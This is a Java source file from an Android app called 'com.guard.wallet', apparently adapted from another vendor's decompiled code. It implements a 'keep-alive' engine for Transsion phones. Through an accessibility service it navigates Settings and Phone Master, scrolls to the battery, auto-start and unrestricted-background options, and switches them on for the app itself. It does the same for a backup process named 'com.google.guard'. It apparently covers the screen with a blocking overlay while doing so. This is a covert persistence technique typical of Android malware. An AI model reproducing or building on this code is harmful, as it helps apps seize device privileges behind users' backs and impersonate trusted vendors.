package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 传音 (Tecno/Itel/Infinix) 保活引擎。
 *
 * ADAPT: Field 'r' shadows class o.r — use EngineHelper constants.
 * ADAPT: Class o.z shadows — use FilterHelper for CombineScrollCondition.
 *
 * vendor 原始路径: o/e0.java
 */
public final class TranssionEngine extends KeepAliveEngine {

    private static final Object KEEP_ALIVE_UNKNOWN = EngineHelper.KEEP_ALIVE_UNKNOWN;
    private static final Object KEEP_ALIVE_MAIN = EngineHelper.KEEP_ALIVE_MAIN;
    private static final Object KEEP_ALIVE_BACKUP = EngineHelper.KEEP_ALIVE_BACKUP;

    public static final int y = 0;

    public final AtomicReference r = new AtomicReference<>(KEEP_ALIVE_UNKNOWN);
    public final AtomicBoolean s = new AtomicBoolean(false);
    public final AtomicBoolean t = new AtomicBoolean(false);
    public final AtomicBoolean u = new AtomicBoolean(true);
    public final AtomicBoolean v = new AtomicBoolean(true);
    public final AtomicBoolean w = new AtomicBoolean(false);
    public final AtomicBoolean x = new AtomicBoolean(false);

    public TranssionEngine() {
        super(n0(), "com.android.settings");
        try {
            super.p.schedule(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 3), 60L, TimeUnit.SECONDS);
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
    }

    // ======= Static CombineFilter builders =======

    public static CombineFilter b0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"))) {
            return null;
        }
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter f0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"))) {
            return null;
        }
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter g0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"))) {
            return null;
        }
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFiltersWithOr q0() {
        CombineFiltersWithOr or = new CombineFiltersWithOr();
        or.setFilters(new LinkedList<>());

        CombineFilter f1 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"))) {
            f1 = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f1,
                    FilterHelper.initFilter(f1, "className", "android.widget.TextView"), "text");
            sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"));
            f1.getStringConditions().add(sc);
        }
        if (f1 != null) {
            or.getFilters().add(f1);
        }

        CombineFilter f2 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
            f2 = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f2,
                    FilterHelper.initFilter(f2, "className", "android.widget.TextView"), "text");
            sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"));
            f2.getStringConditions().add(sc);
        }
        if (f2 != null) {
            or.getFilters().add(f2);
        }

        CombineFilter f3 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
            f3 = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f3,
                    FilterHelper.initFilter(f3, "className", "android.widget.TextView"), "text");
            sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"));
            f3.getStringConditions().add(sc);
        }
        if (f3 != null) {
            or.getFilters().add(f3);
        }

        return or;
    }

    // ======= Static ListenWindow builders =======

    public static ListenWindow c0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow d0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.applications.InstalledAppDetailsTop");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        if (!AppUtils.B(appName)) {
            lw.setMatchs(new LinkedList<>());
            lw.getMatchs().add(H(appName));
        }
        return lw;
    }

    public static ListenWindow e0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.transsion.settings.applications.appinfo.AppInfoSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        if (!AppUtils.B(appName)) {
            lw.setMatchs(new LinkedList<>());
            lw.getMatchs().add(H(appName));
        }
        return lw;
    }

    public static ListenWindow h0() {
        ListenWindow lw = new ListenWindow("com.transsion.phonemaster", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow i0() {
        ListenWindow lw = new ListenWindow("com.transsion.phonemaster",
                "com.cyin.himgr.autostart.AutoStartActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow m0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        if (!AppUtils.B(appName)) {
            lw.setMatchs(new LinkedList<>());
            lw.getMatchs().add(H(appName));
        }
        return lw;
    }

    public static LinkedList n0() {
        LinkedList list = new LinkedList();
        list.add(J());
        list.add(i0());
        list.add(h0());
        list.add(d0(null));
        list.add(e0(null));
        list.add(m0(null));
        list.add(c0());
        return list;
    }

    // ======= Instance methods =======

    @Override
    public final void Z() {
        ReentrantLock lock = super.o;
        if (lock.tryLock()) {
            try {
                if (!this.T()) {
                    Log.d("o.e0", "准备结束本地保活自动化引擎");
                    com.guard.wallet.helper.BlockViewManager.h(100);
                    this.X();
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().x();
                    }
                    this.p0();
                    super.p.shutdownNow();
                    com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
                    super.n.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    com.guard.wallet.helper.BlockViewManager.c();
                    Log.d("o.e0", "已结束本地保活自动化引擎");
                    W();
                    this.d();
                }
            } catch (Exception ex) {
                AppUtils.s("o.e0", ex);
            }
            lock.unlock();
        }
    }

    public final boolean j0() {
        try {
            if (this.q(Collections.singletonList(c0()))) {
                Log.d("o.e0", "已进入App耗电管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
        return false;
    }

    public final boolean k0() {
        try {
            String appLabel = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                    ? com.guard.wallet.utils.SystemHelper.x0()
                    : com.guard.wallet.utils.SystemHelper.e();
            LinkedList list = new LinkedList();
            list.add(d0(appLabel));
            list.add(e0(appLabel));
            list.add(m0(appLabel));
            if (this.q(list)) {
                Log.d("o.e0", "已进入App详情窗口");
                return true;
            }
            return false;
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
            return false;
        }
    }

    public final boolean l0() {
        try {
            LinkedList list = new LinkedList();
            list.add(i0());
            list.add(h0());
            if (this.q(list)) {
                Log.d("o.e0", "已进入自启动管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
        return false;
    }

    /** vendor o0 — scroll through settings to find battery/power management entry */
    public final UiObject o0(UiObject scrollView) {
        UiObject powerResult = null;
        UiObject batteryResult = null;
        UiObject usePowerResult = null;

        try {
            scrollView.refresh();
            Log.d("o.e0", "开始滚动电池电量管理栏目");
            CombineFilter powerFilter = f0();
            CombineFilter batteryFilter = b0();
            CombineFilter usePowerFilter = g0();
            AtomicInteger scrollCount = new AtomicInteger(0);

            if (batteryFilter == null && powerFilter == null && usePowerFilter == null) {
                return null;
            }

            // Initial search
            if (powerFilter != null) {
                powerResult = scrollView.findOneByCombine(powerFilter);
            }
            if (batteryFilter != null) {
                batteryResult = scrollView.findOneByCombine(batteryFilter);
            }
            if (usePowerFilter != null) {
                usePowerResult = scrollView.findOneByCombine(usePowerFilter);
            }

            // Scroll forward to find items
            while (scrollView.canScrollForward() && scrollCount.incrementAndGet() < 10) {
                Log.d("o.e0", "滚动视图可以向下滚动");
                if (batteryResult != null && batteryResult.visibleToUser()) break;
                if (powerResult != null && powerResult.visibleToUser()) break;
                if (usePowerResult != null && usePowerResult.visibleToUser()) break;
                if (!scrollView.scrollForwardByGesture()) continue;
                Log.d("o.e0", "向下滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();
                if (powerFilter != null) {
                    powerResult = scrollView.findOneByCombine(powerFilter);
                }
                if (batteryFilter != null) {
                    batteryResult = scrollView.findOneByCombine(batteryFilter);
                }
                if (usePowerFilter != null) {
                    usePowerResult = scrollView.findOneByCombine(usePowerFilter);
                }
            }
            scrollCount.set(0);

            // Scroll backward if needed
            while (scrollView.canScrollBackward() && scrollCount.incrementAndGet() < 10) {
                Log.d("o.e0", "滚动视图可以向上滚动");
                if (batteryResult != null && batteryResult.visibleToUser()) break;
                if (powerResult != null && powerResult.visibleToUser()) break;
                if (usePowerResult != null && usePowerResult.visibleToUser()) break;
                if (!scrollView.scrollBackwardByGesture()) continue;
                Log.d("o.e0", "向上滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();
                if (powerFilter != null) {
                    powerResult = scrollView.findOneByCombine(powerFilter);
                }
                if (batteryFilter != null) {
                    batteryResult = scrollView.findOneByCombine(batteryFilter);
                }
                if (usePowerFilter != null) {
                    usePowerResult = scrollView.findOneByCombine(usePowerFilter);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }

        // Return in priority order: battery > usePower > power
        if (batteryResult != null) return batteryResult;
        if (usePowerResult != null) return usePowerResult;
        return powerResult;
    }

    public final void p0() {
        try {
            PowerControlStateVO vo = com.guard.wallet.utils.SharedPrefsManager.k(
                    MainApplication.getAppContext().getPackageName());
            vo.setPackageName(MainApplication.getAppContext().getPackageName());
            if (this.s.get()) {
                vo.setAllowAutoStart(this.s.get());
            }
            if (this.u.get()) {
                vo.setAllowRelateStart(this.u.get());
            }
            if (this.w.get()) {
                vo.setAllowAllFullBackground(this.w.get());
            }
            vo.setRetryCount(vo.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(vo);
            Log.d("o.e0", "主进程保活策略已保存");

            PowerControlStateVO vo2 = com.guard.wallet.utils.SharedPrefsManager.k("com.google.guard");
            vo2.setPackageName("com.google.guard");
            if (this.t.get()) {
                vo2.setAllowAutoStart(this.t.get());
            }
            if (this.v.get()) {
                vo2.setAllowRelateStart(this.v.get());
            }
            if (this.x.get()) {
                vo2.setAllowAllFullBackground(this.x.get());
            }
            vo2.setRetryCount(vo2.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(vo2);
            Log.d("o.e0", "备用进程保活策略已保存");
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
    }

    @Override
    public final void u(AccessibilityEvent event, String pkg, String cls) {
        try {
            if (this.T()) {
                return;
            }
            if (event != null) {
                super.u(event, pkg, cls);
            }
            boolean inAppDetail = this.k0();
            String threadId = super.c;
            ConcurrentLinkedQueue taskQueue = super.n;

            if (inAppDetail) {
                taskQueue.remove("keepAliveInAppBattery");
                taskQueue.remove("keepAliveInAutoStart");
                if (!taskQueue.contains("keepAliveInAppDetail")) {
                    taskQueue.add("keepAliveInAppDetail");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 0), threadId);
                }
            }

            // ADAPT: HyperOS 3 降级后 k0()/j0() 同属 com.android.settings 可能同时 true
            else if (this.j0()) {
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAutoStart");
                if (!taskQueue.contains("keepAliveInAppBattery")) {
                    taskQueue.add("keepAliveInAppBattery");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 1), threadId);
                }
            }

            else if (this.l0()) {
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppBattery");
                if (!taskQueue.contains("keepAliveInAutoStart")) {
                    taskQueue.add("keepAliveInAutoStart");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 2), threadId);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.e0", ex);
        }
    }
}
